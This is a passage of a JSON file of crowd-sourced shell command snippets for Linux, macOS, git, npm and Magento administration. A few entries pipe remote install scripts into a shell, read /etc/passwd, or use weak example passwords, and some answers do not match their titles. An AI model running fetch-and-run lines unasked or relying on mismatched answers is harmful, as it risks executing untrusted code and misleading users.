    "title": " list all collections in the MongoDB shell",
    "description": "db.getCollectionNames()\nJavaScript (shell): db.getCollectionNames()  Node.js: db.listCollections()\n",
    "reg_date": "2021-10-11T22:09:49.000Z"
  },
  {
    "id": 3452,
    "keyword": null,
    "link": null,
    "title": " list all services using systemctl",
    "description": "## List all services systemctl list-units  --type=service  ## List running services systemctl list-units  --type=service  --state=running  ## List all svc in simplified way service --status-all\nsystemctl list-units --type=service\n",
    "reg_date": "2021-10-11T22:09:49.000Z"
  },
  {
    "id": 3453,
    "keyword": null,
    "link": null,
    "title": " list all ssh connections ubuntu",
    "description": "ss | grep -i ssh\n",
    "reg_date": "2021-10-11T22:09:49.000Z"
  },
  {
    "id": 3454,
    "keyword": null,
    "link": null,
    "title": " list all users linux",
    "description": "cat /etc/passwd\nawk -F: '{ print $1}' /etc/passwd\ncut -d: -f1 /etc/passwd or cat /etc/passwd\ncut -d: -f1 /etc/passwdCopy\n",
    "reg_date": "2021-10-11T22:09:49.000Z"
  },
  {
    "id": 3455,
    "keyword": null,
    "link": null,
    "title": " list available shells linux",
    "description": "#just type the folowing command in the terminal and press enter cat /etc/shells\n",
    "reg_date": "2021-10-11T22:09:50.000Z"
  },
  {
    "id": 3456,
    "keyword": null,
    "link": null,
    "title": " list aws configuretion",
    "description": "aws configure list [--profile profile-name]\n",
    "reg_date": "2021-10-11T22:09:50.000Z"
  },
  {
    "id": 3457,
    "keyword": null,
    "link": null,
    "title": " list bucket cli",
    "description": "aws s3api list-buckets --query \"Buckets[].Name\"\n",
    "reg_date": "2021-10-11T22:09:50.000Z"
  },
  {
    "id": 3458,
    "keyword": null,
    "link": null,
    "title": " list changed files git",
    "description": "git diff --name-only SHA1 SHA2 \n",
    "reg_date": "2021-10-11T22:09:50.000Z"
  },
  {
    "id": 3459,
    "keyword": null,
    "link": null,
    "title": " list cpu linux command",
    "description": "#hows CPU Architecture Info $ lscpu\n",
    "reg_date": "2021-10-11T22:09:50.000Z"
  },
  {
    "id": 3460,
    "keyword": null,
    "link": null,
    "title": " list cron jobs in ubuntu",
    "description": "crontab -l\n",
    "reg_date": "2021-10-11T22:09:51.000Z"
  },
  {
    "id": 3461,
    "keyword": null,
    "link": null,
    "title": " list cronjobs linux",
    "description": "crontab -l\n",
    "reg_date": "2021-10-11T22:09:51.000Z"
  },
  {
    "id": 3462,
    "keyword": null,
    "link": null,
    "title": " list directories recursively powershell",
    "description": "Get-ChildItem -Recurse\n",
    "reg_date": "2021-10-11T22:09:51.000Z"
  },
  {
    "id": 3463,
    "keyword": null,
    "link": null,
    "title": " list file size as mb",
    "description": "ls -l --block-size=M\n",
    "reg_date": "2021-10-11T22:09:51.000Z"
  },
  {
    "id": 3464,
    "keyword": null,
    "link": null,
    "title": " list interfaces centos",
    "description": "ip link show\n",
    "reg_date": "2021-10-11T22:09:51.000Z"
  },
  {
    "id": 3465,
    "keyword": null,
    "link": null,
    "title": " list node root packages installed",
    "description": "npm list -g --depth=0 \n",
    "reg_date": "2021-10-11T22:09:51.000Z"
  },
  {
    "id": 3466,
    "keyword": null,
    "link": null,
    "title": " list npm packages installed globally",
    "description": "npm list -g --depth 0\nnpm list\tLists the installed versions of all dependencies in this software npm list -g --depth 0\tLists the installed versions of all globally installed packages npm view\tLists the latest versions of all dependencies in this software npm outdated\tLists only the dependencies in this software which are outdated npm ls - list packages\nnpm root -g\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3467,
    "keyword": null,
    "link": null,
    "title": " list of files in git commit",
    "description": "$ git diff-tree --no-commit-id --name-only -r bd61ad98 index.html javascript/application.js javascript/ie6.js \n$ git diff-tree --no-commit-id --name-only -r bd61ad98 index.html javascript/application.js javascript/ie6.js\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3468,
    "keyword": null,
    "link": null,
    "title": " list of running port ubuntu",
    "description": "sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo ss -tulpn | grep LISTEN sudo lsof -i:22 ## see a specific port such as 22 ## sudo nmap -sTU -O IP-address-Here  # Source https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/\nsudo lsof -i -P -n | grep LISTEN\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3469,
    "keyword": null,
    "link": null,
    "title": " list of running ports linux",
    "description": "# Any of the following sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # see a specific port such as 22 sudo nmap -sTU -O IP-address-Here\nnetstat -tulpn\nsudo netstat -tulpn | grep LISTEN  sudo lsof -i:22 # see a specific port such as 22\n## if you use linux sudo ss -tulw \n# it list the all running ports with process id. $ netstat -ltnp\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3470,
    "keyword": null,
    "link": null,
    "title": " list of software installed linux",
    "description": "dpkg-query -W -f='${Installed-Size;8}  ${Package}\\n' | sort -n\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3471,
    "keyword": null,
    "link": null,
    "title": " list packages in conda environment",
    "description": "conda info --envs  conda env list\nconda list -n <my_env>\nconda env list\nconda list\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3472,
    "keyword": null,
    "link": null,
    "title": " list packages linux windows",
    "description": "apt list --installed\napt list --installed | grep program_name\n",
    "reg_date": "2021-10-11T22:09:52.000Z"
  },
  {
    "id": 3473,
    "keyword": null,
    "link": null,
    "title": " list process using port",
    "description": "sudo lsof -n -i :80 | grep LISTEN\nnetstat -ano | findstr 8080Code language: Bash (bash)\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3474,
    "keyword": null,
    "link": null,
    "title": " list used ports on mac",
    "description": "sudo lsof -PiTCP -sTCP:LISTEN  COMMAND     PID      USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME GitHub      850 grgarside   6u   IPv4 0x23c345381d089301      0t0  TCP localhost:25035 (LISTEN)\nsudo lsof -PiTCP -sTCP:LISTEN\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3475,
    "keyword": null,
    "link": null,
    "title": " list users in linux",
    "description": "cat /etc/passwd\nawk -F: '{ print $1}' /etc/passwd\ncut -d: -f1 /etc/passwd or cat /etc/passwd\ncut -d: -f1 /etc/passwdCopy\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3476,
    "keyword": null,
    "link": null,
    "title": " list xcode version on mac",
    "description": "xcodebuild -version\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3477,
    "keyword": null,
    "link": null,
    "title": " listen EADDRINUSE: address already in use :::8081",
    "description": "netstat -ano | findstr :<PORT> taskkill //PID <PID> //F OR taskkill /PID <PID> /F\nsudo lsof -i :<PORT> kill -9 <PID>\nkill -9 {PID}\nps aux | grep node //gets all the nodes and list of PID kill -9 {PID}\nFind server pid: \tlsof -i tcp:5000 (the 5000 is the port number) kill the server: \tkill -9 111119 (the 111119 is the pid)\nstep-1 Enter commond to see running ports & processes ps -ef step-2 To stop port and processes sudo kill {PID}\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3478,
    "keyword": null,
    "link": null,
    "title": " ln phpmyadmin",
    "description": "# http://localhost/phpmyadmin/ sudo ln -s /usr/share/phpmyadmin /var/www/html # or, try include sudo su sudo echo \"Include /etc/phpmyadmin/apache.conf\" >> /etc/apache2/apache2.conf\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3479,
    "keyword": null,
    "link": null,
    "title": " load a dump in postgres 12",
    "description": "# To reload the dump in the database newdb.  pg_restore -d newdb mydumpfile # To reload the dump in a created db. psql -Umyuser mydatabase < mydumpfile\n",
    "reg_date": "2021-10-11T22:09:53.000Z"
  },
  {
    "id": 3480,
    "keyword": null,
    "link": null,
    "title": " locale-gen fa IR.UTF-8 ubuntu",
    "description": "$ locale-gen fa_IR.UTF-8\n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3481,
    "keyword": null,
    "link": null,
    "title": " locate all exe file in powershell",
    "description": "#Navigate to the desired directory you want to search cd C:\\ #Then run the command Get-ChildItem -Filter \"*.exe\" -Recurse    #or gci -Filter \"*.exe\" -Recurse              #the alias for Get-ChildItem is 'gci'  #-Filter \"*.exe\" is an argument that specifies to only find filenames which end  #in \".exe\". (The * is a type of regular expression notation). #-Recurse is an argument that specifies to search all child directories.  #This will make your function run on \"C:/\", but also all child directories of C:/,  #and all child directories of those directories and so on.  #Ommit it if you want to search only that drive.  \n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3482,
    "keyword": null,
    "link": null,
    "title": " locate command not found",
    "description": "##for debian :  sudo apt install mlocate \n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3483,
    "keyword": null,
    "link": null,
    "title": " log of apache ubuntu",
    "description": "# default dir /var/log/apache2/\n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3484,
    "keyword": null,
    "link": null,
    "title": " login git in terminal",
    "description": "git config --global user.name \"your_username\" \ngit config --global user.email \"your_email_address@example.com\" \n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3485,
    "keyword": null,
    "link": null,
    "title": " login github command line",
    "description": "git config --global user.name \"your_username\" \ngit config --global user.email \"your_email_address@example.com\" \n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3486,
    "keyword": null,
    "link": null,
    "title": " login without a password is forbidden by configuration (see allownopassword) ubuntu",
    "description": "$ sudo nano /etc/phpmyadmin/config.inc.php type &ldquo;//&rdquo;  // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;  $ sudo service nginx restart\n",
    "reg_date": "2021-10-11T22:09:54.000Z"
  },
  {
    "id": 3487,
    "keyword": null,
    "link": null,
    "title": " logout of git cli",
    "description": "git config --global --unset-all \ngit config --global --unset user.name git config --global --unset user.email git config --global --unset credential.helper \n",
    "reg_date": "2021-10-11T22:09:55.000Z"
  },
  {
    "id": 3488,
    "keyword": null,
    "link": null,
    "title": " lollypop music player install ubuntu",
    "description": "sudo add-apt-repository ppa:gnumdk/lollypop sudo apt-get update sudo apt-get install lollypop\n",
    "reg_date": "2021-10-11T22:09:55.000Z"
  },
  {
    "id": 3489,
    "keyword": null,
    "link": null,
    "title": " loop from array bash",
    "description": "#!/bin/bash # declare an array called array and define 3 values array=( one two three ) for i in \"${array[@]}\" do \techo $i done\n",
    "reg_date": "2021-10-11T22:09:55.000Z"
  },
  {
    "id": 3490,
    "keyword": null,
    "link": null,
    "title": " loopback install",
    "description": "npm install -g loopback-cli\n",
    "reg_date": "2021-10-11T22:09:55.000Z"
  },
  {
    "id": 3491,
    "keyword": null,
    "link": null,
    "title": " ls | wc -l in other directory",
    "description": "cd \"your path\" && ls | wc -l\n",
    "reg_date": "2021-10-11T22:09:55.000Z"
  },
  {
    "id": 3492,
    "keyword": null,
    "link": null,
    "title": " ls display chmod number",
    "description": "stat -c '%a %n' *\n",
    "reg_date": "2021-10-11T22:09:55.000Z"
  },
  {
    "id": 3493,
    "keyword": null,
    "link": null,
    "title": " ls file size",
    "description": "ls -l --block-size=M\n#Get file size of each folder du -bsh *\n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3494,
    "keyword": null,
    "link": null,
    "title": " ls line by line terminal",
    "description": "ls -1\n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3495,
    "keyword": null,
    "link": null,
    "title": " ls show octal permissions",
    "description": "stat -c \"%a %n\" *\n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3496,
    "keyword": null,
    "link": null,
    "title": " ls size in mb",
    "description": "ls -l --block-size=M\ndu -sh directory_name    #Gives you the summarized(-s) size of the directory in human readable(-h) format du -bsh *                #Gives you the apparent(-b) summarized(-s) size of all the files and directories in the current directory in human readable(-h) format \n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3497,
    "keyword": null,
    "link": null,
    "title": " lsb release: command not found",
    "description": "apt-get update && apt-get install -y lsb-release && apt-get clean all \napt-get install -y lsb-release \n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3498,
    "keyword": null,
    "link": null,
    "title": " lsof port",
    "description": "sudo lsof -i:<port_number>\n$ lsof -i :port # ex. lsof -i :3000\nsudo ss -lptn 'sport = :80'\nlsof -i tcp:53 #Check what is listening on port 53 lsof -t -i tcp:53 #Return the process PID listening on port 53\n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3499,
    "keyword": null,
    "link": null,
    "title": " lumen php run",
    "description": "php -S localhost:8000 -t public\n",
    "reg_date": "2021-10-11T22:09:56.000Z"
  },
  {
    "id": 3500,
    "keyword": null,
    "link": null,
    "title": " lumen run command",
    "description": "php -S localhost:8000 -t public\n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3501,
    "keyword": null,
    "link": null,
    "title": " lumen serve command",
    "description": "php -S localhost:8000 -t public\n php -S localhost:8000 -t ./public\n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3502,
    "keyword": null,
    "link": null,
    "title": " lumen start",
    "description": "php -S localhost:8000 -t public\n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3503,
    "keyword": null,
    "link": null,
    "title": " m1 install gradle",
    "description": "brew install gradle\n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3504,
    "keyword": null,
    "link": null,
    "title": " mac [ncm2 core@yarp] Job is dead nvim",
    "description": "\"\"\"I tried install the module manually, it got failed due to the ssl issue. As some one suggested I ran the command to reinstall python:  brew reinstall python  \"\"\"then  sudo pip3 install --upgrade neovim  \"\"\"after that reopen nvim, the error is gone. Hope this could help!\n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3505,
    "keyword": null,
    "link": null,
    "title": " mac anydesk start at login",
    "description": "sudo rm /Library/LaunchAgents/com.philandro.anydesk.Frontend.plist \n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3506,
    "keyword": null,
    "link": null,
    "title": " mac check shell version",
    "description": "To see what shell is currently running (which may or may not be your default shell), use: ps -o comm= $$  To see what shell is your default shell, run: echo \"$SHELL\"\n",
    "reg_date": "2021-10-11T22:09:57.000Z"
  },
  {
    "id": 3507,
    "keyword": null,
    "link": null,
    "title": " mac command not found: sshpass",
    "description": "brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb\nbrew install esolitos/ipa/sshpass\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3508,
    "keyword": null,
    "link": null,
    "title": " mac dd command write image to disk error bs=1m mac",
    "description": "// list all devices that are mounted and locate the disk your righting to. NOTE IT $ diskutil list   // substitute N for disk number ie disk4  $ diskutil unmountDisk /dev/diskN   // copy the image or write it. the following copys. notice the 'r' added in front of disk // this speeds up the process. press ctrl T to check progress after it starts  $ sudo dd bs=1m if=path_of_your_image.img of=/dev/rdiskN; sync  If the command reports dd: /dev/rdiskN: Resource busy, you need to unmount the volume first sudo diskutil unmountDisk /dev/diskN.  If the command reports dd: bs: illegal numeric value, change the block size bs=1m to bs=1M.  If the command reports dd: /dev/rdiskN: Operation not permitted, go to System Preferences -> Security & Privacy -> Privacy -> Files and Folders -> Give Removable Volumes access to Terminal.  If the command reports dd: /dev/rdiskN: Permission denied, the partition table of the SD card is being protected against being overwritten by Mac OS. Erase the SD card's partition table using this command:  $ sudo diskutil partitionDisk /dev/diskN 1 MBR \"Free Space\" \"%noformat%\" 100%  Above command will also set the permissions on the device to allow writing. Now issue the dd command again.  After the dd command finishes, eject the card:  $ sudo diskutil eject /dev/rdiskN\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3509,
    "keyword": null,
    "link": null,
    "title": " mac error that port is already in use",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\n# list the running ports $ netstat -ltnp # kill specific port in my case for django 8000. kill using PID $ kill -9 31434\nC:\\Program Files (x86)\\Microsoft SQL Server\\140\\Shared>mofcomp sqlmgmproviderxpsp2up.mof\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3510,
    "keyword": null,
    "link": null,
    "title": " mac find large folders",
    "description": "du -sh *  | grep -E \"\\dG\"\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3511,
    "keyword": null,
    "link": null,
    "title": " mac host file",
    "description": "sudo nano /etc/hosts sudo killall -HUP mDNSResponder\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3512,
    "keyword": null,
    "link": null,
    "title": " mac install gpg",
    "description": "brew install gpg\npinentry-program /usr/local/MacGPG2/libexec/pinentry-mac.app/Contents/MacOS/pinentry-mac \n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3513,
    "keyword": null,
    "link": null,
    "title": " mac install pytorch",
    "description": "# Python 3.x pip3 install torch torchvision --user \nconda install pytorch torchvision -c pytorch \npip install torch===1.5.0 torchvision===0.6.0 -f https://download.pytorch.org/whl/torch_stable.html\nconda install pytorch torchvision cudatoolkit=10.2 -c pytorch\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3514,
    "keyword": null,
    "link": null,
    "title": " mac ip find",
    "description": "ipconfig getifaddr en0\nUse for wireless ipconfig getifaddr en1 or for ethernet ipconfig getifaddr en0  ipconfig getifaddr en0 is default for wifi interface.\n",
    "reg_date": "2021-10-11T22:09:58.000Z"
  },
  {
    "id": 3515,
    "keyword": null,
    "link": null,
    "title": " mac kill port 8000",
    "description": "#First run this, to get port information (with the port you want to kill) sudo lsof -i :3000   #Then run this, with <PID> replaced by the value in the column returned by previous command. kill -9 <PID>\nlsof -n -i TCP:8080 COMMAND   PID   USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME node     54762   user   23u  IPv4 XXXXXXXXX      0t0  TCP 127.0.0.1:http-alt (LISTEN) PID // is second field in the response . Then, kill that process:  kill -9 54762 // here put PID number found on the table 54762\nkill $(lsof -ti:3000) \n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3516,
    "keyword": null,
    "link": null,
    "title": " mac kill process by PID",
    "description": "$ sudo kill -9 PID \n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3517,
    "keyword": null,
    "link": null,
    "title": " mac of hide \"upgrade now\"",
    "description": "sudo softwareupdate --ignore \"macOS Big Sur\" \n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3518,
    "keyword": null,
    "link": null,
    "title": " mac os terminal bash command not found",
    "description": "export PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3519,
    "keyword": null,
    "link": null,
    "title": " mac os uninstall oh my zsh",
    "description": "rm -rf ~/.oh-my-zsh rm ~/.zshrc cp ~/.zshrc.pre-oh-my-zsh ~/.zshrc source ~/.zshrc\n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3520,
    "keyword": null,
    "link": null,
    "title": " mac restart mysql server",
    "description": "sudo /usr/local/mysql/support-files/mysql.server restart\n# mysql start/stop/restart # MAC $ cd /Applications/Ampps/mysql/bin $ mysql.server restart #Linux $ /etc/init.d/mysqld restart or $ service mysqld restart or $ systemctl restart mysqld\n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3521,
    "keyword": null,
    "link": null,
    "title": " mac set bash as default shell",
    "description": "chsh -s /bin/bash\n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3522,
    "keyword": null,
    "link": null,
    "title": " mac show cocoapods version",
    "description": "pod --version\n",
    "reg_date": "2021-10-11T22:09:59.000Z"
  },
  {
    "id": 3523,
    "keyword": null,
    "link": null,
    "title": " mac terminal find process by port",
    "description": "sudo lsof -i tcp:3000  \n lsof -i tcp:3000  \n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3524,
    "keyword": null,
    "link": null,
    "title": " macbook Couldn't connect to Docker daemon - you might need to run `docker-machine start default`",
    "description": "$ docker-machine restart default $ eval $(docker-machine env default) // Apparently you need to run the eval $(docker-machine env default) every time you run the quick start terminal.\n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3525,
    "keyword": null,
    "link": null,
    "title": " macbook current path",
    "description": "# pwd stands for print working directory pwd\n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3526,
    "keyword": null,
    "link": null,
    "title": " macbook generate .pem",
    "description": "brew <upgrade|install> openssl  openssl genpkey -algorithm RSA -aes-256-cbc -outform PEM -out private_key.pem -pkeyopt rsa_keygen_bits:2048 chmod 0400 private_key.pem ssh-keygen -e -f private_key.pem > public_key.pem\n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3527,
    "keyword": null,
    "link": null,
    "title": " macbook install php artisan",
    "description": "/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3528,
    "keyword": null,
    "link": null,
    "title": " macbook ubuntu webcam",
    "description": "sudo apt-get install git sudo apt-get install curl xzcat cpio git clone https://github.com/patjak/facetimehd-firmware.git cd facetimehd-firmware make sudo make install cd .. sudo apt-get install kmod libssl-dev checkinstall git clone https://github.com/patjak/bcwc_pcie.git cd bcwc_pcie make sudo make install sudo depmod sudo modprobe -r bdc_pci sudo modprobe facetimehd sudo nano /etc/modules **add line \"facetimehd\", write out (ctl+o) & close** \n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3529,
    "keyword": null,
    "link": null,
    "title": " macos clear dns cache",
    "description": "macbook$ sudo killall -HUP mDNSResponder;sudo killall mDNSResponderHelper;sudo dscacheutil -flushcache\n",
    "reg_date": "2021-10-11T22:10:00.000Z"
  },
  {
    "id": 3530,
    "keyword": null,
    "link": null,
    "title": " macos install airport",
    "description": "sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport\n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3531,
    "keyword": null,
    "link": null,
    "title": " macos install chromium",
    "description": "brew install --cask chromium\nsudo apt install -y chromium-browser # You can also install it from the software center\n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3532,
    "keyword": null,
    "link": null,
    "title": " macos install yarn",
    "description": "brew install yarn \ncurl -o- -L https://yarnpkg.com/install.sh | bash\n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3533,
    "keyword": null,
    "link": null,
    "title": " macos update in terminal",
    "description": "//in terminal //path$  softwareupdate -i -l\n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3534,
    "keyword": null,
    "link": null,
    "title": " magento 2 check version command line",
    "description": "#From your root folder, run this cli command  bin/magento --version \n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3535,
    "keyword": null,
    "link": null,
    "title": " magento 2 file permission",
    "description": "cd /var/www/html/<magento install directory> find var generated vendor pub/static pub/media app/etc -type f -exec chmod g+w {} + find var generated vendor pub/static pub/media app/etc -type d -exec chmod g+ws {} + chown -R :www-data . # Ubuntu chmod u+x bin/magento php bin/magento setup:upgrade php bin/magento setup:di:compile php bin/magento setup:static-content:deploy -f php bin/magento indexer:reindex php bin/magento c:f\n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3536,
    "keyword": null,
    "link": null,
    "title": " magento 2 file permissions",
    "description": "cd /var/www/html/<magento install directory> find var generated vendor pub/static pub/media app/etc -type f -exec chmod g+w {} + find var generated vendor pub/static pub/media app/etc -type d -exec chmod g+ws {} + chown -R :www-data . # Ubuntu chmod u+x bin/magento php bin/magento setup:upgrade php bin/magento setup:di:compile php bin/magento setup:static-content:deploy -f php bin/magento indexer:reindex php bin/magento c:f\nfind . -type f -exec chmod 664 {} \\; find . -type d -exec chmod 775 {} \\; find var pub/static pub/media  generated/ app/etc -type f -exec chmod g+w {} \\; find var pub/static pub/media generated/ app/etc -type d -exec chmod g+ws {} \\;\n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3537,
    "keyword": null,
    "link": null,
    "title": " magento 2 gulp",
    "description": "$ composer require --dev bobmotor/magento-2-gulp \n",
    "reg_date": "2021-10-11T22:10:01.000Z"
  },
  {
    "id": 3538,
    "keyword": null,
    "link": null,
    "title": " magento 2 reindex command line",
    "description": "php bin/magento indexer:reindex\nbin/magento indexer:reindex\n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3539,
    "keyword": null,
    "link": null,
    "title": " magento bin install",
    "description": " php bin/magento setup:install --backend-frontname=\"admin\" --key=\"admin\" --session-save=\"files\" --db-host=\"localhost\" --db-name=\"magento_2_db\" --db-user=\"root\" --db-password=\"root\" --base-url=\"http://local.magento.com/\" --base-url-secure=\"https://local.magento2.com/\" --admin-user=\"admin\" --admin-password=\"admin123\" --admin-email=\"pramod.kharade@example.com\" --admin-firstname=\"Pramod\" --admin-lastname=\"Kharade\" \n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3540,
    "keyword": null,
    "link": null,
    "title": " make: g++: Command not found",
    "description": "apt-get install build-essential \n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3541,
    "keyword": null,
    "link": null,
    "title": " make a symlink windows",
    "description": "#Synopsis mklink /D linkTarget LinkSource  OR  mklink fileTarget fileSource  #Example for directory: mklink /D tina4php D:\\projects\\php\\tina4-php\n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3542,
    "keyword": null,
    "link": null,
    "title": " make docker sudo less",
    "description": "$ sudo groupadd docker $ sudo usermod -aG docker $USER $ newgrp docker \n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3543,
    "keyword": null,
    "link": null,
    "title": " make file executable linux",
    "description": "chmod +x filename.sh \nchmod u+x <fileName>.sh\n> chmod +x my_file\nchmod 755 file.sh\n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3544,
    "keyword": null,
    "link": null,
    "title": " make kitty terminal the default terminal on ubuntu",
    "description": "sudo update-alternatives --install /usr/bin/x-terminal-emulator x-terminal-emulator `which kitty` 50 sudo update-alternatives --config x-terminal-emulator\n#This will output all available terminals sudo update-alternatives --config x-terminal-emulator\nsudo update-alternatives --install /usr/bin/x-terminal-emulator x-terminal-emulator /opt/Hyper/hyper 50\n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3545,
    "keyword": null,
    "link": null,
    "title": " make pip3 pip",
    "description": "sudo apt install python3-pip\nalias pip=pip3 \nInstallation Step 1 - Update system $$$ sudo apt-get update  Step 2 - Install pip3 $$$ sudo apt-get -y install python3-pip  Step 3 - Verification $$$ pip3 --version\nsudo apt install python3-pip \n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3546,
    "keyword": null,
    "link": null,
    "title": " make shell script executable",
    "description": "chmod +x filename.sh \nchmod u+x <fileName>.sh\nchmod 755 file.sh\n#!/bin/sh\n",
    "reg_date": "2021-10-11T22:10:02.000Z"
  },
  {
    "id": 3547,
    "keyword": null,
    "link": null,
    "title": " makepkg resolve auto dependencies",
    "description": "makepkg -si # this will install the package and automaticaly resolve its dependencies\n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3548,
    "keyword": null,
    "link": null,
    "title": " mamp connect to mysql",
    "description": "/Applications/MAMP/Library/bin/mysql -u root -proot\n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3549,
    "keyword": null,
    "link": null,
    "title": " manjaro clean up disk space",
    "description": "sudo pacman -Sc sudo pacman -Qdt sudo pacman -Rns $(pacman -Qtdq) sudo journalctl --vacuum-size=50M\n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3550,
    "keyword": null,
    "link": null,
    "title": " manjaro how to erase a usb",
    "description": "gparted\n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3551,
    "keyword": null,
    "link": null,
    "title": " manjaro install kde",
    "description": "sudo pacman -S plasma kio-extras\n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3552,
    "keyword": null,
    "link": null,
    "title": " manjaro kill port 3000",
    "description": "#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nkill -9 $(lsof -t -i tcp:8080) \n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3553,
    "keyword": null,
    "link": null,
    "title": " manjaro notion",
    "description": "sudo snap install notion-snap\nsudo systemctl enable --now snapd.socket \n",
    "reg_date": "2021-10-11T22:10:03.000Z"
  },
  {
    "id": 3554,
    "keyword": null,
    "link": null,
    "title": " mariadb galera cluster exists on first sync",
    "description": "## Edit this file nano /etc/systemd/system/mysqld.service  ## Add the below at the bottom of the file # For large initial DB syncs enable this setting TimeoutStartSec=9999999999999999  ## After saving run this then restart mariadb systemctl daemon-reload\n",
